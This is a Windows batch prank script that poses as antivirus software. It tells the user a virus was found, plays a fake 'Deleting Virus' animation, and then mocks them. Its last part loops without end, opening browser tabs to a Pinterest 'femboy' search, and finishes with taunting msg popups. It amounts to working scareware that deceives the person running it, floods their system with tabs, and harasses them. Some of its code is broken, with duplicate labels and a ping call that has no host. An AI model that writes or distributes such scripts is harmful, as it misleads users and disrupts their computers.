@echo off 
color 02
echo We have found a virus on your computer.
echo .  
echo Press Fn+F11 for more contex Than press enter.
echo .  
pause
echo Press enter to delete virus there can be some problems.
echo There are gonna be some othere innocent filles that gonna be delete it. 
pause
 
color 02
setlocal enabledelayedexpansion

:: Set het aantal iteraties
set count=0

:: Start Matrix-achtige effect met 600 iteraties
:matrix
if %count% lss 600 (
    set /a count+=1
    set /a r=%random% %% 2
    echo Deleting Virus %r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%
    ping -n 1 >nul 2>nul
    goto matrix
)

:: Einde van het script na 600 iteraties
echo Virus Deletion Complete.
pause 

echo we have found a problem try again
pause 

:: Set het aantal iteraties
set count=0

:: Start Matrix-achtige effect met 600 iteraties
:matrix
if %count% lss 600 (
    set /a count+=1
    set /a r=%random% %% 2
    echo Deleting Virus %r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%%r%
    ping -n 1 >nul 2>nul
    goto matrix
)

:: Einde van het script na 600 iteraties
echo hey you know it was impossible to delete it, so what where you trying? 

:start
start "" "https://nl.pinterest.com/search/pins/?q=femboy"
timeout /t 1 /nobreak >nul
goto start
:start
start "" "https://nl.pinterest.com/search/pins/?q=femboy"
goto start
msg * <you now become a femboy> 
msg * <i never said you can delete the virus> 